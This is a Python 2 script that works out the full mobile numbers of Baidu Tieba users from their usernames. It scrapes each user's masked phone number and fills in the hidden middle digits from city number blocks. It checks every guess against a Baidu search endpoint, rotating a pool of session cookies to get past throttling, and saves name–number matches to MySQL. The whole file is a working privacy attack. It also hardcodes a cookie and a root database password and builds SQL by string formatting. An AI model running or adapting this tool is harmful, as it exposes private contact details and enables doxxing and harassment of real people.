# -*- coding: utf-8 -*-
import re
import time
import json
import requests
import random
import MySQLdb
from urllib import quote

start_time = time.time()
def get_userid(name):
    get_id_url = 'http://tieba.baidu.com/home/main?un=%s&ie=utf-8&fr=pb' % (name)
    id_request = requests.get(get_id_url)
    id_pattern = re.compile(r'"user_id":(\d+),"homeUserName":')
    id = id_pattern.search(id_request.content).group(1)
    return id


def get_numbers(ppid):
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate, sdch',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
        'Cache-Control':'max-age=0',
        'Connection':'keep-alive',
        'Cookie':'BAIDUID=8688C81A7043FD661AB825FB3AF8649E:FG=1;',
        'DNT':'1',
        'Host':'koubei.baidu.com',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36'
    }
    get_number_url = 'http://koubei.baidu.com/home?fr=header&ppid=%s' % (ppid)
    numbers_request = requests.get(get_number_url, headers=headers)
    numbers_pattern = re.compile(r'"securemobil":"(.{11})",')
    try:
        numbers = numbers_pattern.search(numbers_request.content).group(1)
    except:
        print get_number_url
        raise Exception('未绑定手机')
    return numbers


def get_mid(head, city):
    url = 'http://www.chahaoba.com/%s%s' % (quote(city.encode('utf-8')), head)
    respond = requests.get(url).content
    pattern_str = '">%s(\d{4})</a></li>' % head
    numbers_pattern = re.compile(pattern_str)
    mid_list = numbers_pattern.findall(respond)
    if city == '':
        mid_list = get_all_numbers()
        return mid_list
    #return ['3923']
    print '共存在%s个号段, 待检测号码%s个' % (len(mid_list), len(mid_list) * 10)
    return list(set(mid_list))


def get_all_numbers():
    all_numbers = []

    for i in range(10):
        all_numbers.append('000%d' % i)
    for i in  range(10, 100):
        all_numbers.append('00%d' % i)
    for i in range(100, 1000):
        all_numbers.append('0%d' % i)
    for i in range(1000,10000):
        all_numbers.append('%d' % i)
    return all_numbers


def get_info(phone, cookies, count):
    url = r'http://m.baidu.com/searchbox?action=userx&type=search&service=bdbox&osname=baidubox&data=%%7B%%22content%%22:%%22%s%%22%%7D' % phone
    while True:
        count = count % 10000
        info = requests.get(url, cookies=cookies[count]).content
        info_json = json.loads(info)
        error = info_json['errno']
        if error != '-1':
            break
        elif error == '-1':
            pass
        count += 1
    if error != '0':
        return '', count
    name = info_json['data']['userx']['search']['dataset']['display_name']
    return name, count


def get_exact_phone(name, city, cookies):
    count = random.randint(1000,10000)
    phone_name_dist = {}
    uid = get_userid(name)
    phone_with_mosaic = get_numbers(uid)
    print '%s\n' % phone_with_mosaic
    head = phone_with_mosaic[:3]
    tail = phone_with_mosaic[-3:]
    phone_mid_list = get_mid(head, city)
    for mid in phone_mid_list:
        for i in range(10):
            phone_tmp = '%s%s%s%s' % (head, mid, i, tail)
            name_tmp, count = get_info(phone_tmp, cookies, count)
            if name_tmp != '':
                print '%s %s' % (name_tmp, phone_tmp)
                phone_name_dist[name_tmp] = phone_tmp
    return phone_name_dist


def print_phone(name, city, cookies):
    name_dist = get_exact_phone(name, city, cookies)
    conn = MySQLdb.connect(host='localhost', user='root', passwd='0010', db='baidu_info', port=3306)
    cur = conn.cursor()
    for key, value in name_dist.items():
        cur.execute('insert ignore into info (id, phone) values ("%s", "%s")' % (quote(key.encode('utf-8')), value))
    conn.commit()
    cur.close()
    conn.close()
    try:
        print name.encode('utf-8')
        print name_dist[name]
        return 'Name: %s  Phone: %s time:%s' % (name.encode('utf-8'), name_dist[name], time.time()-start_time)
    except:
        return u'找不到 %s 的手机号码,可能是由于您提供的位置不正确' % name

